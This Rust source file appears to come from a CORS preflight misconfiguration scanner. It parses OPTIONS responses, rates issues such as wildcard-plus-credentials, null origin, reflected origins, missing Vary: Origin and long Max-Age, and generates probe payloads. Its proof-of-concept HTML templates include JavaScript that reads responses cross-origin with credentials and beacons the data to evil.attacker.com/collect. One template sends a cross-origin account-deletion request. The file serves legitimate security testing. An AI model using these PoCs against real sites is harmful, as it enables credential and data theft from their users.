use std::collections::HashMap;
use std::time::Duration;

use serde::{Deserialize, Serialize};

/// CORS preflight cache poisoning vulnerability categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PreflightAbuse {
    /// Inject malicious Access-Control headers via cached OPTIONS responses.
    CachePoisoning,
    /// Long-lived preflight caches that persist after CORS policy fixes.
    MaxAgeAbuse,
    /// Poison OPTIONS cache to allow additional HTTP methods.
    MethodAllowlistExpansion,
    /// Poison cache to allow additional request headers.
    HeaderAllowlistExpansion,
    /// Poison cache to enable Access-Control-Allow-Credentials.
    CredentialsEscalation,
    /// Detect the fatal wildcard origin + credentials combo.
    WildcardOriginCredentials,
    /// Bypass origin checking via sandboxed iframe null origin.
    NullOriginBypass,
    /// Exploit Vary header inconsistencies between cache and origin.
    VaryHeaderAbuse,
}

impl std::fmt::Display for PreflightAbuse {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::CachePoisoning => write!(f, "Preflight Cache Poisoning"),
            Self::MaxAgeAbuse => write!(f, "Access-Control-Max-Age Abuse"),
            Self::MethodAllowlistExpansion => write!(f, "Method Allowlist Expansion"),
            Self::HeaderAllowlistExpansion => write!(f, "Header Allowlist Expansion"),
            Self::CredentialsEscalation => write!(f, "Credentials Escalation"),
            Self::WildcardOriginCredentials => write!(f, "Wildcard Origin + Credentials"),
            Self::NullOriginBypass => write!(f, "Null Origin via Iframe Sandbox"),
            Self::VaryHeaderAbuse => write!(f, "Vary Header Inconsistency"),
        }
    }
}

/// Parsed CORS headers from an OPTIONS response.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CorsPreflightResponse {
    pub status: u16,
    pub allow_origin: Option<String>,
    pub allow_methods: Vec<String>,
    pub allow_headers: Vec<String>,
    pub allow_credentials: bool,
    pub max_age_seconds: Option<u64>,
    pub expose_headers: Vec<String>,
    pub vary_headers: Vec<String>,
    pub response_time_ms: u64,
    pub all_headers: Vec<(String, String)>,
}

impl CorsPreflightResponse {
    pub fn from_headers(status: u16, headers: &[(String, String)], response_time_ms: u64) -> Self {
        let mut resp = Self {
            status,
            response_time_ms,
            all_headers: headers.to_vec(),
            ..Default::default()
        };

        for (name, value) in headers {
            let lower = name.to_lowercase();
            match lower.as_str() {
                "access-control-allow-origin" => {
                    resp.allow_origin = Some(value.clone());
                }
                "access-control-allow-methods" => {
                    resp.allow_methods = split_header_list(value);
                }
                "access-control-allow-headers" => {
                    resp.allow_headers = split_header_list(value);
                }
                "access-control-allow-credentials" => {
                    resp.allow_credentials = value.trim().eq_ignore_ascii_case("true");
                }
                "access-control-max-age" => {
                    resp.max_age_seconds = value.trim().parse().ok();
                }
                "access-control-expose-headers" => {
                    resp.expose_headers = split_header_list(value);
                }
                "vary" => {
                    resp.vary_headers = split_header_list(value);
                }
                _ => {}
            }
        }

        resp
    }
}

/// A single preflight cache poisoning payload.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CachePoisonPayload {
    pub id: usize,
    pub abuse_type: PreflightAbuse,
    pub description: String,
    pub origin: String,
    pub method: String,
    pub request_headers: Vec<(String, String)>,
    pub expected_cached_behavior: String,
}

/// Timing sample used to detect preflight caching behavior.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingSample {
    pub request_index: usize,
    pub response_time_ms: u64,
    pub origin_sent: String,
    pub method_sent: String,
}

/// Result of cache timing analysis.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CacheTimingResult {
    pub is_cached: bool,
    pub initial_time_ms: u64,
    pub subsequent_avg_ms: u64,
    pub speedup_ratio: f64,
    pub samples: Vec<TimingSample>,
}

/// A confirmed CORS preflight vulnerability finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightFinding {
    pub abuse_type: PreflightAbuse,
    pub severity: Severity,
    pub endpoint: String,
    pub description: String,
    pub evidence: PreflightEvidence,
    pub poc_html: String,
}

/// Evidence supporting a preflight finding.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightEvidence {
    pub poisoned_origin: Option<String>,
    pub reflected_headers: Vec<(String, String)>,
    pub max_age_seconds: Option<u64>,
    pub cache_timing: Option<CacheTimingResult>,
}

/// Severity level for findings.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Info => write!(f, "Info"),
            Self::Low => write!(f, "Low"),
            Self::Medium => write!(f, "Medium"),
            Self::High => write!(f, "High"),
            Self::Critical => write!(f, "Critical"),
        }
    }
}

/// Max-Age analysis result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MaxAgeAnalysis {
    pub max_age_seconds: u64,
    pub is_overly_permissive: bool,
    pub risk_level: Severity,
    pub persistence_window: Duration,
    pub recommendation: String,
}

/// Full analysis result from a preflight cache abuse scan.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightAnalysisResult {
    pub endpoint: String,
    pub preflight_response: CorsPreflightResponse,
    pub cache_timing: Option<CacheTimingResult>,
    pub max_age_analysis: Option<MaxAgeAnalysis>,
    pub findings: Vec<PreflightFinding>,
    pub payloads_generated: Vec<CachePoisonPayload>,
}

/// Threshold (seconds) above which max-age is considered overly permissive.
const MAX_AGE_WARN_THRESHOLD: u64 = 7200;
/// Threshold above which max-age is high severity.
const MAX_AGE_HIGH_THRESHOLD: u64 = 86400;
/// Speedup ratio threshold to confirm caching behavior.
const CACHE_SPEEDUP_THRESHOLD: f64 = 1.5;

/// Analyze cache timing samples to detect preflight caching.
pub fn analyze_cache_timing(samples: &[TimingSample]) -> CacheTimingResult {
    if samples.is_empty() {
        return CacheTimingResult {
            is_cached: false,
            initial_time_ms: 0,
            subsequent_avg_ms: 0,
            speedup_ratio: 1.0,
            samples: Vec::new(),
        };
    }

    let initial_time_ms = samples[0].response_time_ms;
    let subsequent: Vec<u64> = samples.iter().skip(1).map(|s| s.response_time_ms).collect();
    let subsequent_avg_ms = if subsequent.is_empty() {
        initial_time_ms
    } else {
        subsequent.iter().sum::<u64>() / subsequent.len() as u64
    };

    let speedup_ratio = if subsequent_avg_ms == 0 {
        f64::INFINITY
    } else {
        initial_time_ms as f64 / subsequent_avg_ms as f64
    };

    let is_cached = speedup_ratio >= CACHE_SPEEDUP_THRESHOLD;

    CacheTimingResult {
        is_cached,
        initial_time_ms,
        subsequent_avg_ms,
        speedup_ratio,
        samples: samples.to_vec(),
    }
}

/// Analyze the Access-Control-Max-Age value for abuse potential.
pub fn analyze_max_age(max_age_seconds: u64) -> MaxAgeAnalysis {
    let (is_overly_permissive, risk_level, recommendation) = if max_age_seconds >= MAX_AGE_HIGH_THRESHOLD {
        (
            true,
            Severity::High,
            format!(
                "Max-Age of {} seconds ({:.1} days) allows poisoned preflight to persist long after a CORS fix is deployed. Reduce to under {} seconds.",
                max_age_seconds,
                max_age_seconds as f64 / 86400.0,
                MAX_AGE_WARN_THRESHOLD
            ),
        )
    } else if max_age_seconds >= MAX_AGE_WARN_THRESHOLD {
        (
            true,
            Severity::Medium,
            format!(
                "Max-Age of {} seconds ({:.1} hours) is moderately permissive. Consider reducing to under 600 seconds for sensitive endpoints.",
                max_age_seconds,
                max_age_seconds as f64 / 3600.0
            ),
        )
    } else {
        (
            false,
            Severity::Info,
            format!(
                "Max-Age of {} seconds is within acceptable range.",
                max_age_seconds
            ),
        )
    };

    MaxAgeAnalysis {
        max_age_seconds,
        is_overly_permissive,
        risk_level,
        persistence_window: Duration::from_secs(max_age_seconds),
        recommendation,
    }
}

/// Generate cache poisoning payload variants targeting the given endpoint.
/// Returns at least 5 distinct payload variants.
pub fn generate_poison_payloads(endpoint: &str, baseline: &CorsPreflightResponse) -> Vec<CachePoisonPayload> {
    let mut payloads = Vec::new();
    let mut id = 0;

    // Payload 1: Origin reflection poisoning — inject attacker-controlled origin
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::CachePoisoning,
        description: "Inject attacker-controlled origin into cached preflight response. If the server reflects the Origin header without validation, the cached response grants cross-origin access.".into(),
        origin: "https://evil.attacker.com".into(),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), "https://evil.attacker.com".into()),
            ("Access-Control-Request-Method".into(), "GET".into()),
        ],
        expected_cached_behavior: "Cached response includes Access-Control-Allow-Origin: https://evil.attacker.com".into(),
    });

    // Payload 2: Method expansion — request dangerous methods
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::MethodAllowlistExpansion,
        description: "Poison the preflight cache to allow dangerous HTTP methods (PUT, DELETE, PATCH) that may not be intended for cross-origin use.".into(),
        origin: "https://trusted-but-compromised.com".into(),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), "https://trusted-but-compromised.com".into()),
            ("Access-Control-Request-Method".into(), "DELETE".into()),
        ],
        expected_cached_behavior: "Cached response includes DELETE in Access-Control-Allow-Methods".into(),
    });

    // Payload 3: Header expansion — request sensitive headers
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::HeaderAllowlistExpansion,
        description: "Poison preflight cache to allow Authorization and X-Custom headers in cross-origin requests.".into(),
        origin: "https://evil.attacker.com".into(),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), "https://evil.attacker.com".into()),
            ("Access-Control-Request-Method".into(), "POST".into()),
            ("Access-Control-Request-Headers".into(), "Authorization, X-CSRF-Token, X-Custom-Header".into()),
        ],
        expected_cached_behavior: "Cached response includes Authorization in Access-Control-Allow-Headers".into(),
    });

    // Payload 4: Credentials escalation
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::CredentialsEscalation,
        description: "Trigger a preflight response that enables credentials (cookies/auth headers) in cross-origin requests. Combined with origin reflection, allows full credential theft.".into(),
        origin: "https://evil.attacker.com".into(),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), "https://evil.attacker.com".into()),
            ("Access-Control-Request-Method".into(), "POST".into()),
            ("Access-Control-Request-Headers".into(), "Authorization, Cookie".into()),
        ],
        expected_cached_behavior: "Cached response includes Access-Control-Allow-Credentials: true with reflected origin".into(),
    });

    // Payload 5: Null origin via sandbox
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::NullOriginBypass,
        description: "Send Origin: null (mimicking sandboxed iframe) to bypass allowlist-based origin checking. Many servers whitelist null for development.".into(),
        origin: "null".into(),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), "null".into()),
            ("Access-Control-Request-Method".into(), "POST".into()),
        ],
        expected_cached_behavior: "Cached response includes Access-Control-Allow-Origin: null".into(),
    });

    // Payload 6: Wildcard + credentials combo
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::WildcardOriginCredentials,
        description: "Probe for the fatal wildcard origin (*) combined with credentials: true misconfiguration. Browsers block this, but misconfigured reverse proxies may cache the invalid combo.".into(),
        origin: "https://probe.attacker.com".into(),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), "https://probe.attacker.com".into()),
            ("Access-Control-Request-Method".into(), "GET".into()),
            ("Access-Control-Request-Headers".into(), "Authorization".into()),
        ],
        expected_cached_behavior: "Response includes Access-Control-Allow-Origin: * AND Access-Control-Allow-Credentials: true".into(),
    });

    // Payload 7: Vary header mismatch — cache key pollution
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::VaryHeaderAbuse,
        description: "Exploit missing Vary: Origin header — CDN caches the first preflight response and serves it to all origins, regardless of the requesting origin.".into(),
        origin: "https://attacker-vary-probe.com".into(),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), "https://attacker-vary-probe.com".into()),
            ("Access-Control-Request-Method".into(), "GET".into()),
            ("Cache-Control".into(), "no-transform".into()),
        ],
        expected_cached_behavior: "Response lacks Vary: Origin, meaning CDN may serve this cached response to all origins".into(),
    });

    // Payload 8: Max-Age persistence after fix
    if let Some(max_age) = baseline.max_age_seconds
        && max_age >= MAX_AGE_WARN_THRESHOLD
    {
        payloads.push(CachePoisonPayload {
            id: { id += 1; id },
            abuse_type: PreflightAbuse::MaxAgeAbuse,
            description: format!(
                "Preflight response cached for {} seconds ({:.1} hours). Poisoned cache entry persists even after server-side CORS policy is corrected.",
                max_age, max_age as f64 / 3600.0
            ),
            origin: "https://evil.attacker.com".into(),
            method: "OPTIONS".into(),
            request_headers: vec![
                ("Origin".into(), "https://evil.attacker.com".into()),
                ("Access-Control-Request-Method".into(), "GET".into()),
            ],
            expected_cached_behavior: format!(
                "Cached poisoned preflight persists for {} seconds after policy change",
                max_age
            ),
        });
    }

    // Payload 9: Subdomain takeover origin
    payloads.push(CachePoisonPayload {
        id: { id += 1; id },
        abuse_type: PreflightAbuse::CachePoisoning,
        description: "Use a subdomain origin pattern that may match lax regex-based allowlists (e.g., attacker-owned subdomain of trusted domain).".into(),
        origin: format!("https://evil.{}", extract_domain(endpoint)),
        method: "OPTIONS".into(),
        request_headers: vec![
            ("Origin".into(), format!("https://evil.{}", extract_domain(endpoint))),
            ("Access-Control-Request-Method".into(), "POST".into()),
        ],
        expected_cached_behavior: "Server reflects subdomain origin due to lax regex matching, cached for subsequent requests".into(),
    });

    payloads
}

/// Analyze a preflight response for all CORS abuse patterns.
pub fn analyze_preflight(endpoint: &str, response: &CorsPreflightResponse) -> Vec<PreflightFinding> {
    let mut findings = Vec::new();

    // Check wildcard origin + credentials (Critical)
    if let Some(ref origin) = response.allow_origin
        && origin == "*" && response.allow_credentials
    {
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::WildcardOriginCredentials,
            severity: Severity::Critical,
            endpoint: endpoint.into(),
            description: "Fatal CORS misconfiguration: Access-Control-Allow-Origin: * combined with Access-Control-Allow-Credentials: true. While browsers reject this, misconfigured proxies and CDN caches may serve the response, enabling cross-origin credential theft.".into(),
            evidence: PreflightEvidence {
                poisoned_origin: Some("*".into()),
                reflected_headers: vec![
                    ("Access-Control-Allow-Origin".into(), "*".into()),
                    ("Access-Control-Allow-Credentials".into(), "true".into()),
                ],
                max_age_seconds: response.max_age_seconds,
                cache_timing: None,
            },
            poc_html: generate_poc_wildcard_credentials(endpoint),
        });
    }

    // Check null origin acceptance
    if let Some(ref origin) = response.allow_origin
        && origin == "null"
    {
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::NullOriginBypass,
            severity: Severity::High,
            endpoint: endpoint.into(),
            description: "Server accepts Origin: null, which can be triggered by sandboxed iframes. An attacker hosts an iframe with sandbox attribute that sends requests with Origin: null, bypassing domain-based allowlists.".into(),
            evidence: PreflightEvidence {
                poisoned_origin: Some("null".into()),
                reflected_headers: vec![
                    ("Access-Control-Allow-Origin".into(), "null".into()),
                ],
                max_age_seconds: response.max_age_seconds,
                cache_timing: None,
            },
            poc_html: generate_poc_null_origin(endpoint),
        });
    }

    // Check origin reflection (potential cache poisoning)
    if let Some(ref origin) = response.allow_origin
        && origin != "*"
        && origin != "null"
        && origin.starts_with("https://evil")
    {
        let severity = if response.allow_credentials {
            Severity::Critical
        } else {
            Severity::High
        };
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::CachePoisoning,
            severity,
            endpoint: endpoint.into(),
            description: format!(
                "Server reflects attacker-controlled origin '{}' in Access-Control-Allow-Origin. {} If the preflight response is cached, all subsequent requests from any origin receive the poisoned CORS headers.",
                origin,
                if response.allow_credentials {
                    "Combined with credentials: true, this enables full cross-origin credential theft."
                } else {
                    "Cross-origin data exfiltration is possible for non-credentialed requests."
                }
            ),
            evidence: PreflightEvidence {
                poisoned_origin: Some(origin.clone()),
                reflected_headers: vec![
                    ("Access-Control-Allow-Origin".into(), origin.clone()),
                ],
                max_age_seconds: response.max_age_seconds,
                cache_timing: None,
            },
            poc_html: generate_poc_origin_reflection(endpoint, origin, response.allow_credentials),
        });
    }

    // Check credentials escalation
    if response.allow_credentials
        && let Some(ref origin) = response.allow_origin
        && origin != "*" && !origin.starts_with("https://evil") && origin != "null"
    {
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::CredentialsEscalation,
            severity: Severity::Medium,
            endpoint: endpoint.into(),
            description: format!(
                "Preflight response enables credentials for origin '{}'. If combined with origin reflection, cookies and auth headers are sent cross-origin.",
                origin
            ),
            evidence: PreflightEvidence {
                poisoned_origin: Some(origin.clone()),
                reflected_headers: vec![
                    ("Access-Control-Allow-Credentials".into(), "true".into()),
                ],
                max_age_seconds: response.max_age_seconds,
                cache_timing: None,
            },
            poc_html: generate_poc_credentials_escalation(endpoint, origin),
        });
    }

    // Check method allowlist expansion
    let dangerous_methods = ["DELETE", "PUT", "PATCH"];
    let expanded_methods: Vec<String> = response
        .allow_methods
        .iter()
        .filter(|m| dangerous_methods.contains(&m.to_uppercase().as_str()))
        .cloned()
        .collect();
    if !expanded_methods.is_empty() {
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::MethodAllowlistExpansion,
            severity: Severity::Medium,
            endpoint: endpoint.into(),
            description: format!(
                "Preflight response allows dangerous HTTP methods: {}. A poisoned cache entry granting these methods enables state-changing cross-origin requests.",
                expanded_methods.join(", ")
            ),
            evidence: PreflightEvidence {
                poisoned_origin: response.allow_origin.clone(),
                reflected_headers: vec![
                    ("Access-Control-Allow-Methods".into(), response.allow_methods.join(", ")),
                ],
                max_age_seconds: response.max_age_seconds,
                cache_timing: None,
            },
            poc_html: generate_poc_method_expansion(endpoint, &expanded_methods),
        });
    }

    // Check header allowlist expansion
    let sensitive_headers = ["authorization", "x-csrf-token", "cookie", "x-api-key"];
    let expanded_headers: Vec<String> = response
        .allow_headers
        .iter()
        .filter(|h| sensitive_headers.contains(&h.to_lowercase().as_str()))
        .cloned()
        .collect();
    if !expanded_headers.is_empty() {
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::HeaderAllowlistExpansion,
            severity: Severity::Medium,
            endpoint: endpoint.into(),
            description: format!(
                "Preflight response allows sensitive request headers: {}. Cross-origin requests can now include auth tokens and CSRF headers.",
                expanded_headers.join(", ")
            ),
            evidence: PreflightEvidence {
                poisoned_origin: response.allow_origin.clone(),
                reflected_headers: vec![
                    ("Access-Control-Allow-Headers".into(), response.allow_headers.join(", ")),
                ],
                max_age_seconds: response.max_age_seconds,
                cache_timing: None,
            },
            poc_html: generate_poc_header_expansion(endpoint, &expanded_headers),
        });
    }

    // Check max-age abuse
    if let Some(max_age) = response.max_age_seconds
        && max_age >= MAX_AGE_WARN_THRESHOLD
    {
        let analysis = analyze_max_age(max_age);
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::MaxAgeAbuse,
            severity: analysis.risk_level,
            endpoint: endpoint.into(),
            description: format!(
                "Access-Control-Max-Age set to {} seconds. {}",
                max_age, analysis.recommendation
            ),
            evidence: PreflightEvidence {
                poisoned_origin: response.allow_origin.clone(),
                reflected_headers: vec![
                    ("Access-Control-Max-Age".into(), max_age.to_string()),
                ],
                max_age_seconds: Some(max_age),
                cache_timing: None,
            },
            poc_html: generate_poc_max_age(endpoint, max_age),
        });
    }

    // Check Vary header inconsistencies
    let has_vary_origin = response
        .vary_headers
        .iter()
        .any(|v| v.eq_ignore_ascii_case("origin"));
    if response.allow_origin.is_some() && !has_vary_origin {
        findings.push(PreflightFinding {
            abuse_type: PreflightAbuse::VaryHeaderAbuse,
            severity: Severity::High,
            endpoint: endpoint.into(),
            description: "Preflight response sets Access-Control-Allow-Origin but lacks Vary: Origin. CDN and browser caches may serve a single cached preflight to all origins, enabling cache poisoning across the entire origin space.".into(),
            evidence: PreflightEvidence {
                poisoned_origin: response.allow_origin.clone(),
                reflected_headers: vec![
                    ("Vary".into(), response.vary_headers.join(", ")),
                ],
                max_age_seconds: response.max_age_seconds,
                cache_timing: None,
            },
            poc_html: generate_poc_vary_abuse(endpoint),
        });
    }

    findings
}

/// Run the full preflight cache abuse analysis against an endpoint.
pub fn run_preflight_analysis(
    endpoint: &str,
    response: &CorsPreflightResponse,
    timing_samples: &[TimingSample],
) -> PreflightAnalysisResult {
    let cache_timing = if timing_samples.is_empty() {
        None
    } else {
        Some(analyze_cache_timing(timing_samples))
    };

    let max_age_analysis = response.max_age_seconds.map(analyze_max_age);

    let mut findings = analyze_preflight(endpoint, response);

    // Attach cache timing evidence to findings if caching detected
    if let Some(ref timing) = cache_timing
        && timing.is_cached
    {
        for finding in &mut findings {
            finding.evidence.cache_timing = Some(timing.clone());
        }
    }

    let payloads = generate_poison_payloads(endpoint, response);

    PreflightAnalysisResult {
        endpoint: endpoint.into(),
        preflight_response: response.clone(),
        cache_timing,
        max_age_analysis,
        findings,
        payloads_generated: payloads,
    }
}

/// Build a mapping of abuse types to their findings for quick lookup.
pub fn findings_by_type(findings: &[PreflightFinding]) -> HashMap<PreflightAbuse, Vec<&PreflightFinding>> {
    let mut map: HashMap<PreflightAbuse, Vec<&PreflightFinding>> = HashMap::new();
    for f in findings {
        map.entry(f.abuse_type).or_default().push(f);
    }
    map
}

/// Count findings at or above a given severity.
pub fn count_by_min_severity(findings: &[PreflightFinding], min: Severity) -> usize {
    findings.iter().filter(|f| f.severity >= min).count()
}

fn generate_poc_wildcard_credentials(endpoint: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS Wildcard + Credentials PoC</title></head>
<body>
<h1>CORS Wildcard Origin + Credentials Exploit</h1>
<p>Target: {endpoint}</p>
<script>
// The server responds with Access-Control-Allow-Origin: * AND
// Access-Control-Allow-Credentials: true. While browsers reject this,
// misconfigured reverse proxies/CDNs may cache and serve the response.
fetch("{endpoint}", {{
  method: "GET",
  credentials: "include"
}})
.then(r => r.text())
.then(data => {{
  document.getElementById("exfil").textContent = data;
  // Exfiltrate to attacker server
  new Image().src = "https://evil.attacker.com/collect?data=" + encodeURIComponent(data);
}})
.catch(e => document.getElementById("exfil").textContent = "Blocked: " + e);
</script>
<pre id="exfil">Waiting...</pre>
</body>
</html>"#
    )
}

fn generate_poc_null_origin(endpoint: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Null Origin Bypass PoC</title></head>
<body>
<h1>CORS Null Origin Bypass via Sandboxed Iframe</h1>
<p>Target: {endpoint}</p>
<iframe sandbox="allow-scripts" srcdoc='
<script>
// Sandboxed iframe sends Origin: null
fetch("{endpoint}", {{
  method: "POST",
  credentials: "include",
  headers: {{"Content-Type": "application/json"}},
  body: JSON.stringify({{"action": "exfiltrate"}})
}})
.then(r => r.text())
.then(data => parent.postMessage(data, "*"));
</script>
'></iframe>
<script>
window.addEventListener("message", function(e) {{
  document.getElementById("result").textContent = e.data;
  new Image().src = "https://evil.attacker.com/collect?data=" + encodeURIComponent(e.data);
}});
</script>
<pre id="result">Waiting for iframe response...</pre>
</body>
</html>"#
    )
}

fn generate_poc_origin_reflection(endpoint: &str, reflected_origin: &str, with_credentials: bool) -> String {
    let cred_line = if with_credentials {
        "  credentials: \"include\","
    } else {
        "  // No credentials mode — data-only exfiltration"
    };
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Origin Reflection Cache Poison PoC</title></head>
<body>
<h1>CORS Origin Reflection + Cache Poisoning</h1>
<p>Target: {endpoint}</p>
<p>Reflected origin: {reflected_origin}</p>
<script>
// Step 1: Poison the preflight cache with attacker origin
// The OPTIONS response is cached with Access-Control-Allow-Origin: {reflected_origin}
fetch("{endpoint}", {{
  method: "POST",
{cred_line}
  headers: {{
    "Content-Type": "application/json"
  }},
  body: JSON.stringify({{"steal": true}})
}})
.then(r => r.text())
.then(data => {{
  document.getElementById("stolen").textContent = data;
  new Image().src = "https://evil.attacker.com/collect?data=" + encodeURIComponent(data);
}});
</script>
<pre id="stolen">Attempting cross-origin read...</pre>
</body>
</html>"#
    )
}

fn generate_poc_credentials_escalation(endpoint: &str, origin: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Credentials Escalation PoC</title></head>
<body>
<h1>CORS Credentials Escalation</h1>
<p>Target: {endpoint}</p>
<p>Allowed origin: {origin}</p>
<script>
// If attacker controls or compromises the allowed origin,
// credentials (cookies, auth headers) are sent cross-origin.
fetch("{endpoint}", {{
  method: "GET",
  credentials: "include"
}})
.then(r => r.text())
.then(data => {{
  document.getElementById("data").textContent = data;
}});
</script>
<pre id="data">Fetching with credentials...</pre>
</body>
</html>"#
    )
}

fn generate_poc_method_expansion(endpoint: &str, methods: &[String]) -> String {
    let method = methods.first().map_or("DELETE", |m| m.as_str());
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Method Expansion PoC</title></head>
<body>
<h1>CORS Method Allowlist Expansion</h1>
<p>Target: {endpoint}</p>
<p>Expanded methods: {methods}</p>
<script>
// The poisoned preflight cache allows dangerous methods cross-origin
fetch("{endpoint}", {{
  method: "{method}",
  headers: {{
    "Content-Type": "application/json"
  }},
  body: JSON.stringify({{"delete_account": true}})
}})
.then(r => {{
  document.getElementById("result").textContent = r.status + " " + r.statusText;
}});
</script>
<pre id="result">Sending {method} request...</pre>
</body>
</html>"#,
        methods = methods.join(", ")
    )
}

fn generate_poc_header_expansion(endpoint: &str, headers: &[String]) -> String {
    let header_entries: String = headers
        .iter()
        .map(|h| format!("    \"{}\": \"attacker-value\"", h))
        .collect::<Vec<_>>()
        .join(",\n");
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Header Expansion PoC</title></head>
<body>
<h1>CORS Header Allowlist Expansion</h1>
<p>Target: {endpoint}</p>
<p>Expanded headers: {headers}</p>
<script>
// Poisoned preflight cache allows sensitive custom headers
fetch("{endpoint}", {{
  method: "POST",
  headers: {{
{header_entries}
  }},
  body: "exfiltrate"
}})
.then(r => r.text())
.then(data => {{
  document.getElementById("result").textContent = data;
}});
</script>
<pre id="result">Sending request with expanded headers...</pre>
</body>
</html>"#,
        headers = headers.join(", ")
    )
}

fn generate_poc_max_age(endpoint: &str, max_age: u64) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Max-Age Persistence PoC</title></head>
<body>
<h1>CORS Preflight Max-Age Persistence Attack</h1>
<p>Target: {endpoint}</p>
<p>Max-Age: {max_age} seconds ({hours:.1} hours)</p>
<script>
// Step 1: Poison the preflight cache now (with malicious origin)
// Step 2: Even after the server-side CORS policy is fixed,
//         the browser continues using the cached poisoned preflight
//         for up to {max_age} seconds.
var startTime = Date.now();
fetch("{endpoint}", {{
  method: "POST",
  headers: {{ "Content-Type": "application/json" }},
  body: JSON.stringify({{"poison": true}})
}})
.then(r => {{
  var elapsed = Date.now() - startTime;
  document.getElementById("result").textContent =
    "Preflight completed in " + elapsed + "ms. " +
    "Cached for " + {max_age} + " seconds. " +
    "Server-side fix will not take effect until cache expires.";
}});
</script>
<pre id="result">Poisoning preflight cache...</pre>
</body>
</html>"#,
        hours = max_age as f64 / 3600.0
    )
}

fn generate_poc_vary_abuse(endpoint: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>Vary Header Abuse PoC</title></head>
<body>
<h1>CORS Vary Header Inconsistency</h1>
<p>Target: {endpoint}</p>
<script>
// The server sets Access-Control-Allow-Origin but does NOT include
// Vary: Origin. CDN caches serve the same preflight response to
// all origins. Attacker poisons the cache from evil.com, and
// all other origins receive the poisoned CORS headers.

// Step 1: Attacker primes the cache
fetch("{endpoint}", {{
  method: "OPTIONS",
  headers: {{
    "Origin": "https://evil.attacker.com",
    "Access-Control-Request-Method": "GET"
  }}
}}).then(function() {{
  // Step 2: Victim's browser uses the cached (poisoned) preflight
  document.getElementById("result").textContent =
    "Cache primed. Subsequent requests from any origin will use the " +
    "poisoned preflight response granting access to evil.attacker.com.";
}});
</script>
<pre id="result">Priming CDN cache with attacker origin...</pre>
</body>
</html>"#
    )
}

fn split_header_list(value: &str) -> Vec<String> {
    value
        .split(',')
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

fn extract_domain(endpoint: &str) -> String {
    let without_scheme = endpoint
        .strip_prefix("https://")
        .or_else(|| endpoint.strip_prefix("http://"))
        .unwrap_or(endpoint);
    without_scheme
        .split('/')
        .next()
        .unwrap_or("example.com")
        .split(':')
        .next()
        .unwrap_or("example.com")
        .to_string()
}

#[cfg(test)]
#[path = "preflight_cache_abuse_test.rs"]
mod preflight_cache_abuse_test;
